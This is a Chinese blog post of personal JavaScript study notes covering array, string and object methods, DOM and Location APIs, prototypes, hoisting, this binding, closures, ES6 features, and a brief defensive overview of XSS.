---
title: 重温前端-js篇
author: kif
tags:
  - javascript
categories:
  - 学习笔记
  - 前端
cover: 'https://kifimg.oss-cn-beijing.aliyuncs.com/project/202204241829907.jpg'
coverWidth: 1200
coverHeight: 750
abbrlink: c03c
date: 2022-02-03 15:42:00
---
## Javascript

### 1、JS中的instanceof运算符

instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上

```
obj instanceof Object;//true 实例obj在不在Object构造函数中
```

eg：

请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。

```
function _instanceof(left,right) {
    // 补全代码
    return (left instanceof right )
    
}
```

### 2、排序

sort() 方法对数组的项目进行排序。

按升序对数组中的数字进行排序：

```
var points = [40, 100, 1, 5, 25, 10];
points.sort(function(a, b){return a-b});
```

按降序对数组中的数字进行排序：

```
var points = [40, 100, 1, 5, 25, 10];
points.sort(function(a, b){return b-a});
```

### 3、JS字符串大写和小写之间的转换

String 字符串大小写转换方法

| 字符串方法          | 说明               |
| ------------------- | ------------------ |
| toLocaleLowerCase() | 把字符串转换成小写 |
| toLocaleUpperCase() | 将字符串转换成大写 |
| toLowerCase()       | 将字符串转换成小写 |
| toUpperCase()       | 将字符串转换成大写 |

```js
var s = "JavaScript";
console.log(s.toUpperCase()); 
```



### 4、javascript如何删除指定数组元素

1. 使用delete关键字；

   ```
   var colors = ["red", "blue", "grey", "green"];
   delete colors[0];
   console.log(colors); // [undefined, "blue", "grey", "green"]
   
   ```

   **使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了**

2. 使用splice()操作方法；

   ```
   var colors = ["red", "blue", "grey"];
   var color = colors.splice(0, 1);
   console.log(color); // "red"
   console.log(colors); // ["blue", "grey"]
   ```

   在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。

   

3. 迭代方法，用循环迭代数组元素，发现符合要删除的项则删除；

   第一种用最常见的ForEach循环来对比元素找到之后将其删除。
   
   ```
   var colors = ["red", "blue", "grey"];
   colors.forEach(function(item, index, arr) {    if(item === "red") {
           arr.splice(index, 1);
       }
   })
   var colors = ["red", "blue", "grey"];
   colors = colors.filter(function(item) {    return item != "red"}); 
   console.log(colors); // ["blue", "grey"]
   ```

   

4. prototype原型方法，在Array的原型上添加方法来达到删除的目的。







### 5、数组方法

#### 数组方法概括

| 方法名        | 对应版本 | 功能                                                         | 原数组是否改变 |
| ------------- | :------- | :----------------------------------------------------------- | :------------- |
| concat()      | ES5-     | 合并数组，并返回合并之后的数据                               | n              |
| join()        | ES5-     | 使用分隔符，将数组转为字符串并返回                           | n              |
| pop()         | ES5-     | 删除最后一位，并返回删除的数据                               | y              |
| shift()       | ES5-     | 删除第一位，并返回删除的数据                                 | y              |
| unshift()     | ES5-     | 在第一位新增一或多个数据，返回长度                           | y              |
| push()        | ES5-     | 在最后一位新增一或多个数据，返回长度                         | y              |
| reverse()     | ES5-     | 反转数组，返回结果                                           | y              |
| slice()       | ES5-     | 截取指定位置的数组，并返回                                   | n              |
| sort()        | ES5-     | 排序（字符规则），返回结果                                   | y              |
| splice()      | ES5-     | 删除指定位置，并替换，返回删除的数据                         | y              |
| toString()    | ES5-     | 直接转为字符串，并返回                                       | n              |
| valueOf()     | ES5-     | 返回数组对象的原始值                                         | n              |
| indexOf()     | ES5      | 查询并返回数据的索引                                         | n              |
| lastIndexOf() | ES5      | 反向查询并返回数据的索引                                     | n              |
| forEach()     | ES5      | 参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值 | n              |
| map()         | ES5      | 同forEach，同时回调函数返回数据，组成新数组由map返回         | n              |
| filter()      | ES5      | 同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回 | n              |
| every()       | ES5      | 同forEach，同时回调函数返回布尔值，全部为true，由every返回true | n              |
| some()        | ES5      | 同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true | n              |
| reduce()      | ES5      | 归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回 | n              |
| reduceRight() | ES5      | 反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回 | n              |

**用slice(0)复制一个数组**

**a.splice(index,0,item)：在数组a的第index位置插入item**

**最大值 ;Math.max.apply(Math,array)**





### 6、对象

#### Number 对象



Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下：

```
var myNum = new Number(value);
var myNum = Number(value);
```

其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。

eg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。

```
function _numbertoobject(number) {
    // 补全代码
    var myNum = new Number(number);
    return myNum
    
}
```

#### **对象字符串**

JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。

创建 String 对象的语法格式如下：

```
var val = new String(value);
var val = String(value);
```













#### 对象属性遍历：

- 使用 for in 循环遍历对象的属性时，**原型链上的所有属性**都将被访问：

  ```js
  var obj={"name":"wjy","age":26,"sex":"female"};//定义一个object对象   
  var keys=[];//定义一个数组用来接受key   
  var values=[];//定义一个数组用来接受value   
    for(var key in obj){   
      keys.push(key);   
      values.push(obj[key]);//取得value     
      }   
  alert("keys is ："+keys+" and values is ："+values);  
  ```

  

- Object.keys(xx)/Object.values(xx)

  ```js
  console.log(Object.keys(obj));
  console.log(Object.values(obj));
  //输出：["name", "career"]
  //输出：[ "Poly", "it"]
  ```

#### 添加属性

```js
   //创建obj对象
    var obj = new Object();
    //为对象添加动态属性
    obj.userName = "admin";
    obj.passWord = "123456";
    //输出
    console.log(obj); 
```

#### 删除对象属性

```js
    //创建obj动态对象
    var obj = new Object();
    //为对象添加动态属性
    obj.userName = "admin";
    obj.passWord = "123456";    
    //移除属性
    delete obj.passWord;
    console.log(obj);
```



### 7、字符串

#### String 对象中的方法

下表中列举了 String 对象中提供的方法及其描述信息：



| 方法                | 描述                                                         |
| ------------------- | ------------------------------------------------------------ |
| anchor()            | 创建一个 HTML 锚点，即生成一个`<a>`标签，标签的 name 属性为 anchor() 方法中的参数 |
| big()               | 用大号字体显示字符串                                         |
| blink()             | 显示闪动的字符串                                             |
| bold()              | 使用粗体显示字符串                                           |
| charAt()            | 返回在指定位置的字符                                         |
| charCodeAt()        | 返回指定字符的 Unicode 编码                                  |
| concat()            | 拼接字符串                                                   |
| fixed()             | 以打字机文本显示字符串                                       |
| fontcolor()         | 使用指定的颜色来显示字符串                                   |
| fontsize()          | 使用指定的尺寸来显示字符串                                   |
| fromCharCode()      | 将字符编码转换为一个字符串                                   |
| indexOf()           | 检索字符串，获取给定字符串在字符串对象中首次出现的位置       |
| italics()           | 使用斜体显示字符串                                           |
| lastIndexOf()       | 获取给定字符串在字符串对象中最后出现的位置                   |
| link()              | 将字符串显示为链接                                           |
| localeCompare()     | 返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串 |
| match()             | 根据正则表达式匹配字符串中的字符                             |
| replace()           | 替换与正则表达式匹配的子字符串                               |
| search()            | 获取与正则表达式相匹配字符串首次出现的位置                   |
| slice()             | 截取字符串的片断，并将其返回                                 |
| small()             | 使用小字号来显示字符串                                       |
| split()             | 根据给定字符将字符串分割为字符串数组                         |
| strike()            | 使用删除线来显示字符串                                       |
| sub()               | 把字符串显示为下标                                           |
| substr()            | 从指定索引位置截取指定长度的字符串                           |
| substring()         | 截取字符串中两个指定的索引之间的字符                         |
| sup()               | 把字符串显示为上标                                           |
| toLocaleLowerCase() | 把字符串转换为小写                                           |
| toLocaleUpperCase() | 把字符串转换为大写                                           |
| toLowerCase()       | 把字符串转换为小写                                           |
| toUpperCase()       | 把字符串转换为大写                                           |
| toString()          | 返回字符串                                                   |
| valueOf()           | 返回某个字符串对象的原始值                                   |

#### 去除字符串左右两边的空格

```js
let str = "   123   ";
str=str.trim(); // 123
```



### 8、js 时间与时间戳的转换

#### 时间转时间戳：

javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳

```
var timetamp4 = Number(new Date()) 
```

#### 时间戳转时间

```
function _date(number) {
  let date = new Date(number);
  let y = date.getFullYear();
  let m = date.getMonth()+1;
  let d = date.getDate();
  return (y + "-" + m + "-" + d);  
}
```

###  9、Arguments 对象

**`arguments`** 是一个对应于传递给函数的参数的类数组对象。

```
function func1(a, b, c) {
  console.log(arguments[0]);
  // expected output: 1

  console.log(arguments[1]);
  // expected output: 2

  console.log(arguments[2]);
  // expected output: 3
}

func1(1, 2, 3);
```



### 10、Document 对象

#### Document 对象属性和方法

HTML文档中可以使用以下属性和方法:

| 属性 / 方法                                                  | 描述                                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [document.activeElement](https://www.runoob.com/jsref/prop-document-activeelement.html) | 返回当前获取焦点元素                                         |
| [document.addEventListener()](https://www.runoob.com/jsref/met-document-addeventlistener.html) | 向文档添加句柄                                               |
| [document.adoptNode(node)](https://www.runoob.com/jsref/met-document-adoptnode.html) | 从另外一个文档返回 adapded 节点到当前文档。                  |
| [document.anchors](https://www.runoob.com/jsref/coll-doc-anchors.html) | 返回对文档中所有 Anchor 对象的引用。                         |
| document.applets                                             | 返回对文档中所有 Applet 对象的引用。**注意:** HTML5 已不支持 <applet> 元素。 |
| [document.baseURI](https://www.runoob.com/jsref/prop-doc-baseuri.html) | 返回文档的绝对基础 URI                                       |
| [document.body](https://www.runoob.com/jsref/prop-doc-body.html) | 返回文档的body元素                                           |
| [document.close()](https://www.runoob.com/jsref/met-doc-close.html) | 关闭用 document.open() 方法打开的输出流，并显示选定的数据。  |
| [document.cookie](https://www.runoob.com/jsref/prop-doc-cookie.html) | 设置或返回与当前文档有关的所有 cookie。                      |
| [document.createAttribute()](https://www.runoob.com/jsref/met-document-createattribute.html) | 创建一个属性节点                                             |
| [document.createComment()](https://www.runoob.com/jsref/met-document-createcomment.html) | createComment() 方法可创建注释节点。                         |
| [document.createDocumentFragment()](https://www.runoob.com/jsref/met-document-createdocumentfragment.html) | 创建空的 DocumentFragment 对象，并返回此对象。               |
| [document.createElement()](https://www.runoob.com/jsref/met-document-createelement.html) | 创建元素节点。                                               |
| [document.createTextNode()](https://www.runoob.com/jsref/met-document-createtextnode.html) | 创建文本节点。                                               |
| [document.doctype](https://www.runoob.com/jsref/prop-document-doctype.html) | 返回与文档相关的文档类型声明 (DTD)。                         |
| [document.documentElement](https://www.runoob.com/jsref/prop-document-documentelement.html) | 返回文档的根节点                                             |
| [document.documentMode](https://www.runoob.com/jsref/prop-doc-documentmode.html) | 返回用于通过浏览器渲染文档的模式                             |
| [document.documentURI](https://www.runoob.com/jsref/prop-document-documenturi.html) | 设置或返回文档的位置                                         |
| [document.domain](https://www.runoob.com/jsref/prop-doc-domain.html) | 返回当前文档的域名。                                         |
| document.domConfig                                           | **已废弃**。返回 normalizeDocument() 被调用时所使用的配置。  |
| [document.embeds](https://www.runoob.com/jsref/coll-doc-embeds.html) | 返回文档中所有嵌入的内容（embed）集合                        |
| [document.forms](https://www.runoob.com/jsref/coll-doc-forms.html) | 返回对文档中所有 Form 对象引用。                             |
| [document.getElementsByClassName()](https://www.runoob.com/jsref/met-document-getelementsbyclassname.html) | 返回文档中所有指定类名的元素集合，作为 NodeList 对象。       |
| [document.getElementById()](https://www.runoob.com/jsref/met-document-getelementbyid.html) | 返回对拥有指定 id 的第一个对象的引用。                       |
| [document.getElementsByName()](https://www.runoob.com/jsref/met-doc-getelementsbyname.html) | 返回带有指定名称的对象集合。                                 |
| [document.getElementsByTagName()](https://www.runoob.com/jsref/met-document-getelementsbytagname.html) | 返回带有指定标签名的对象集合。                               |
| [document.images](https://www.runoob.com/jsref/coll-doc-images.html) | 返回对文档中所有 Image 对象引用。                            |
| [document.implementation](https://www.runoob.com/jsref/prop-document-implementation.html) | 返回处理该文档的 DOMImplementation 对象。                    |
| [document.importNode()](https://www.runoob.com/jsref/met-document-importnode.html) | 把一个节点从另一个文档复制到该文档以便应用。                 |
| [document.inputEncoding](https://www.runoob.com/jsref/prop-document-inputencoding.html) | 返回用于文档的编码方式（在解析时）。                         |
| [document.lastModified](https://www.runoob.com/jsref/prop-doc-lastmodified.html) | 返回文档被最后修改的日期和时间。                             |
| [document.links](https://www.runoob.com/jsref/coll-doc-links.html) | 返回对文档中所有 Area 和 Link 对象引用。                     |
| [document.normalize()](https://www.runoob.com/jsref/met-document-normalize.html) | 删除空文本节点，并连接相邻节点                               |
| [document.normalizeDocument()](https://www.runoob.com/jsref/met-document-normalizedocument.html) | 删除空文本节点，并连接相邻节点的                             |
| [document.open()](https://www.runoob.com/jsref/met-doc-open.html) | 打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。 |
| [document.querySelector()](https://www.runoob.com/jsref/met-document-queryselector.html) | 返回文档中匹配指定的CSS选择器的第一元素                      |
| [document.querySelectorAll()](https://www.runoob.com/jsref/met-document-queryselectorall.html) | document.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表 |
| [document.readyState](https://www.runoob.com/jsref/prop-doc-readystate.html) | 返回文档状态 (载入中……)                                      |
| [document.referrer](https://www.runoob.com/jsref/prop-doc-referrer.html) | 返回载入当前文档的文档的 URL。                               |
| [document.removeEventListener()](https://www.runoob.com/jsref/met-document-removeeventlistener.html) | 移除文档中的事件句柄(由 addEventListener() 方法添加)         |
| [document.renameNode()](https://www.runoob.com/jsref/met-document-renamenode.html) | 重命名元素或者属性节点。                                     |
| [document.scripts](https://www.runoob.com/jsref/coll-doc-scripts.html) | 返回页面中所有脚本的集合。                                   |
| [document.strictErrorChecking](https://www.runoob.com/jsref/prop-document-stricterrorchecking.html) | 设置或返回是否强制进行错误检查。                             |
| [document.title](https://www.runoob.com/jsref/prop-doc-title.html) | 返回当前文档的标题。                                         |
| [document.URL](https://www.runoob.com/jsref/prop-doc-url.html) | 返回文档完整的URL                                            |
| [document.write()](https://www.runoob.com/jsref/met-doc-write.html) | 向文档写 HTML 表达式 或 JavaScript 代码。                    |
| [document.writeln()](https://www.runoob.com/jsref/met-doc-writeln.html) | 等同于 write() 方法，不同的是在每个表达式之后写一个换行符。  |



### 11、JS中阻止冒泡事件

冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。

```html
<div class="box">
	<button class="btn">按钮</button>
</div>

<script type="text/javascript">
	$('.btn').click(function () {
		alert('按钮被点击了')
	});
	$('.box').click(function () {
		alert('box被点击了')
	})
</script>
```

当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件



```js
	$('.btn').click(function (even) {
		even.stopPropagation();
		alert('按钮被点击了');
	})

```

### 12、阻止默认事件

```
<a href="javascript:;">链接</a>

<a href="javascript:void(0);">链接</a>

```



```
<a href="" id="link">链接</a>

<script>
        document.getElementById("link").onclick = function (){
            console.log("666");
            return false;
        }
</script>

```



```
<a href="" id="link">链接</a>

<script>
    document.getElementById("link").onclick = function (e){
        console.log("666");
        e.preventDefault();
    }
</script>

```



### 13、window.location

#### Location 对象属性

| 属性                                                         | 描述                                          |
| :----------------------------------------------------------- | :-------------------------------------------- |
| [hash](https://www.w3school.com.cn/jsref/prop_loc_hash.asp)  | 设置或返回从井号 (#) 开始的 URL（锚）。       |
| [host](https://www.w3school.com.cn/jsref/prop_loc_host.asp)  | 设置或返回主机名和当前 URL 的端口号。         |
| [hostname](https://www.w3school.com.cn/jsref/prop_loc_hostname.asp) | 设置或返回当前 URL 的主机名。                 |
| [href](https://www.w3school.com.cn/jsref/prop_loc_href.asp)  | 设置或返回完整的 URL。                        |
| [pathname](https://www.w3school.com.cn/jsref/prop_loc_pathname.asp) | 设置或返回当前 URL 的路径部分。               |
| [port](https://www.w3school.com.cn/jsref/prop_loc_port.asp)  | 设置或返回当前 URL 的端口号。                 |
| [protocol](https://www.w3school.com.cn/jsref/prop_loc_protocol.asp) | 设置或返回当前 URL 的协议。                   |
| [search](https://www.w3school.com.cn/jsref/prop_loc_search.asp) | 设置或返回从问号 (?) 开始的 URL（查询部分）。 |

#### Location 对象方法

| 属性                                                         | 描述                     |
| :----------------------------------------------------------- | :----------------------- |
| [assign()](https://www.w3school.com.cn/jsref/met_loc_assign.asp) | 加载新的文档。           |
| [reload()](https://www.w3school.com.cn/jsref/met_loc_reload.asp) | 重新加载当前文档。       |
| [replace()](https://www.w3school.com.cn/jsref/met_loc_replace.asp) | 用新的文档替换当前文档。 |





### 14、原型与原型链

#### 原型 prototype

原型是函数特有

```js
   <script>
        function fu(){

        }
        fu.prototype.name = 'kif'
        console.log(fu.prototype.name)
    </script>
```

挂载在原型上是为了继承(通过new)



![image-20220313141218874](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846409.png)



![image-20220313143722625](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846610.png)

继承后查找时就近，

判断属性时继承的还是后天添加的：hasOwnProperty



![image-20220313144106245](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846172.png)

可以拿到p1的私有属性

这个方法既不是Persion也不是p1的，而是Persion继承自Object的

![image-20220313144302492](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846687.png)

![image-20220313144416164](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846218.png)

#### 原型链：\_proto_

对象，数组，函数等有原型链

![image-20220313140745799](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847761.png)





### 预编译

```js
function fn(a,c){
	console.log(a)
	var a =123;
	console.log(a)
	console.log(c)
	function a(){}
	if(false){
		var  d =678
	}
	console.log(d)
	console.log(b)
	var b =function(){}
	console.log(b)
	function c(){}
	console.log(c)
}
fn(2,3)


```

 预编译步骤：

1. 创建AO对象

   ```
   AO：{
   
   }
   ```

   

2. 找形参和变量声明

   ```
   AO：{
   	a:undefind
   	c:undefind
   	d:undefind
   	bLundefind
   }
   ```

   

3. 实参与形参相统一

   ```
   AO：{
   	a:2
   	c:3
   	d:undefind
   	b:undefind
   }
   ```

   

4. 找函数申明（会覆盖变量）

   

   ```
   AO：{
   	a:function a(){}
   	c:function c(){}
   	d:undefind
   	b:undefind
   }
   ```

   注:var b =function(){}不是函数声明

5. 逐行执行

   ```
   function fn(a,c){
   	console.log(a)//function a(){}
   	var a =123;
   	console.log(a)//123
   	console.log(c)//function c(){}
   	function a(){}
   	if(false){
   		var  d =678
   	}
   	console.log(d)//undefind
   	console.log(b)//undefind
   	var b =function(){}
   	console.log(b)//function(){}
   	function c(){}
   	console.log(c)//function c(){}
   }
   fn(2,3)
   
   
   ```

   ![image-20220313175244724](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847985.png)

### 15、this

#### 函数直接调用

```
function get(a){
    console.log(a)
}
get('kif')

```

其中 **get('kif')** 其实是**get.call(window,'kif' )**

![image-20220313181429301](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847478.png)

即：对象.方法.call(对象，参数)

#### 对象方法

```js
var Persion = {
    name: 'kif',
    getName: function (time) {
        console.log(this.name,time)
    }
}
Persion.getName(299)

```

同理：

Persion.getName(299)为：Persion.getName.call(Persion,299)

![image-20220313181905131](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847377.png)



#### 案例：

```js
var name = 222
var a={
    name :111,
    say:function(){
        console.log(this.name)
    }
}
var fun = a.say
fun()//fun.call(window,)======>222
a.say()//a.say.call(a,)=======>111
var b ={
    name:333,
    say:function(fun){
        fun()//fun.call(window,)//222
    }
}
b.say(a.say)//
b.say=a.say
b.say()//b.say.call(b,)=======>333
```

#### 箭头函数中this

```js
var x =11
var p ={
    x:22,
    say:()=>{
        console.log(this.x)
    }
}
p.say()
```

箭头函数中this固定指向代码块外部

![image-20220313185716281](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847387.png)





#### this指向（普通函数、箭头函数）

**参考答案：**

普通函数中的this

1. 谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁

```js
        let getThis = function () {
            console.log(this);
        }

        let obj={
            name:"Jack",
            getThis:function(){
                console.log(this);
            }
        }
        //getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window
        getThis();//window
        //此处的getThis()方法是obj这个对象调用的，所以this指向obj
        obj.getThis();//obj
```

1. 匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象；

```js
        let obj = {
            getThis: function () {
                return function () {
                    console.log(this);
                }
            }
        }
        obj.getThis()(); //window
```

上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)：

```js
       let obj = {
            getThis: function () {
            //提前保存this指向
                let _this=this
                return function () {
                    console.log(_this);
                }
            }
        }
        obj.getThis()(); //obj
```

1. 箭头函数中的this
   1. 箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的；
   2. 箭头函数中的this指向父级作用域的执行上下文；（技巧：**因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this**）
   3. 箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。

例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。

```js
        let obj = {
            //此处的this即是箭头函数中的this
            getThis: function () {
                return  ()=> {
                    console.log(this);
                }
            }
        }
        obj.getThis()(); //obj
```

例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。

[复制代码](https://www.nowcoder.com/study/live/691/2/9#)

```js
        //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。
       let obj = {
            getThis: ()=> {
                return  ()=> {
                    console.log(this);
                }
            }
        }
        obj.getThis()(); //window
```





### 16、闭包

####  形式：

方法里面返回一个方法

```js
function a() {
        let a = 1;
        return function () {
          return a;
        };
      }
```



#### 意义：

1. 延长变量生命周期
2. 创建私有环境

 

Vue中data也是一个闭包

```
data（）{
	return{
	
	}
}
```

会常驻内存，所以慎用



### 17、ES6

#### var let const



##### var:

1. 变量提升

   ```js
   console.log(a)//undefined
   var a = 12
   ```

   

2. 变量覆盖

   ```js
   var a =12
   var a =23
   console.log(a)//23
   ```

   

3. 没有块级作用域

   ```js
   function fu(){
   	for(var i=0;i<3;i++){
   		console.log(i)
   	}
   	console.log(i)//3
   }
   ```

   

##### const:

1. const声明之后必须赋值

2. const定义数组，可以对数组修改

   ```js
   const arr = ["sad", "666", "qewqe"];
   arr.push('5465')
   console.log(arr)
   ```

   

#### 解构

```
let a=1;
let b =2;

```

不使用第三个变量互换值

```
[a,b]=[b,a]
```

#### 去重



```js
let arr=[1,2,3,4,5,2,3,4,2]
let ans = [...new Set(arr)]
console.log(ans)
```

#### promise

```js
let p = new Promise((resolve, reject) => {
    console.log(1)
    resolve()
    console.log(2)
})
p.then(() => {
    console.log(3)
})
console.log(4)
```

- 构造函数同步执行   //1,2
- 异步函数异步执行 //4,3



### 18、xss

xss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；
首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “<> , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；
攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ；

### 19、SEO

SEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。



### 20、数组去重



ES6：

```js
let  arr = [12, 12, 3, 2, 23, 23, 4, 3, 2];

function unique(arr) {
  return Array.from(new Set(arr));
}
console.log(unique(arr));

```

```js
let arr = [12, 12, 34, 21, 34, 21, 5, 2, 5];
function unique(arr) {
  return [...new Set(arr)];
}
console.log(unique(arr));

```



ES5：

```js
let arr = [12, 12, 3, 4, 4, 3, 5, 23, 12, 3];
function unique(arr) {
  let Newarr = [];
  for (let i = 0; i < arr.length; i++) {
    if (Newarr.indexOf(arr[i]) == -1) {
      Newarr.push(arr[i]);
    }
  }
  return Newarr;
}
console.log(unique(arr));

```



### 21、数组和伪数组的区别



1. 定义

- 数组是一个特殊对象,与常规对象的区别：
  - 当由新元素添加到列表中时，自动更新length属性
  - 设置length属性，可以截断数组
  - 从Array.protoype中继承了方法
  - 属性为'Array'
- 类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。

1. 区别
   本质：类数组是简单对象，它的原型关系与数组不同。

```js
// 原型关系和原始值转换
let arrayLike = {
    length: 10,
};
console.log(arrayLike instanceof Array); // false
console.log(arrayLike.__proto__.constructor === Array); // false
console.log(arrayLike.toString()); // [object Object]
console.log(arrayLike.valueOf()); // {length: 10}

let array = [];
console.log(array instanceof Array); // true
console.log(array.__proto__.constructor === Array); // true
console.log(array.toString()); // ''
console.log(array.valueOf()); // []
```

1. 类数组转换为数组

- 转换方法
  - 使用 `Array.from()`
  - 使用 `Array.prototype.slice.call()`
  - 使用 `Array.prototype.forEach()` 进行属性遍历并组成新的数组
- 转换须知
  - 转换后的数组长度由 `length` 属性决定。索引不连续时转换结果是连续的，会自动补位。
  - 代码示例

```js
let al1 = {
    length: 4,
    0: 0,
    1: 1,
    3: 3,
    4: 4,
    5: 5,
};
console.log(Array.from(al1)) // [0, 1, undefined, 3]
```

- ②仅考虑 0或正整数 的索引

```js
// 代码示例
let al2 = {
    length: 4,
    '-1': -1,
    '0': 0,
    a: 'a',
    1: 1
};
console.log(Array.from(al2)); // [0, 1, undefined, undefined]
```

- ③使用slice转换产生稀疏数组

```js
// 代码示例
let al2 = {
    length: 4,
    '-1': -1,
    '0': 0,
    a: 'a',
    1: 1
};
console.log(Array.prototype.slice.call(al2)); //[0, 1, empty × 2]
```

1. 使用数组方法操作类数组注意地方

[复制代码](https://www.nowcoder.com/study/live/691/2/4#)

```js
  let arrayLike2 = {
    2: 3,
    3: 4,
    length: 2,
    push: Array.prototype.push
  }

  // push 操作的是索引值为 length 的位置
  arrayLike2.push(1);
  console.log(arrayLike2); // {2: 1, 3: 4, length: 3, push: ƒ}
  arrayLike2.push(2);
  console.log(arrayLike2); // {2: 1, 3: 2, length: 4, push: ƒ}
```





### 22、手写一个发布订阅

```js
// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;
interface CacheProps {
  [key: string]: Array<((data?: unknown) => void)>;
}

class Observer {
  private caches: CacheProps = {}; // 事件中心
  on (eventName: string, fn: (data?: unknown) => void){ // eventName事件名-独一无二, fn订阅后执行的自定义行为
    this.caches[eventName] = this.caches[eventName] || [];
    this.caches[eventName].push(fn);
  }

  emit (eventName: string, data?: unknown) { // 发布 => 将订阅的事件进行统一执行
    if (this.caches[eventName]) {
      this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data));
    }
  }

  off (eventName: string, fn?: (data?: unknown) => void) { // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息
    if (this.caches[eventName]) {
      const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : [];
      this.caches[eventName] = newCaches;
    }
  }

}
```







### 23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？

**参考答案**：

**Set**

1. 成员不能重复；
2. 只有键值，没有键名，有点类似数组；
3. 可以遍历，方法有 `add、delete、has`

**WeakSet**

1. 成员都是对象（引用）；
2. 成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；
3. 不能遍历，方法有 `add、delete、has`；

**Map**

1. 本质上是键值对的集合，类似集合；
2. 可以遍历，方法很多，可以跟各种数据格式转换；

**WeakMap**

1. 只接收对象为键名（null 除外），不接受其他类型的值作为键名；
2. 键名指向的对象，不计入垃圾回收机制；
3. 不能遍历，方法同 `get、set、has、delete`；



### 24、简单说说 js 中有哪几种内存泄露的情况



1. 意外的全局变量；
2. 闭包；
3. 未被清空的定时器；
4. 未被销毁的事件监听；
5. DOM 引用；



### 25、json和xml数据的区别

**参考答案**：

1. 数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。
2. 数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。
3. 数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互
4. 数据描述方面：json对数据的描述性比xml较差
5. xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。



### 26、JavaScript有几种方法判断变量的类型?

**参考答案**：

1. 使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。
2. 使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。
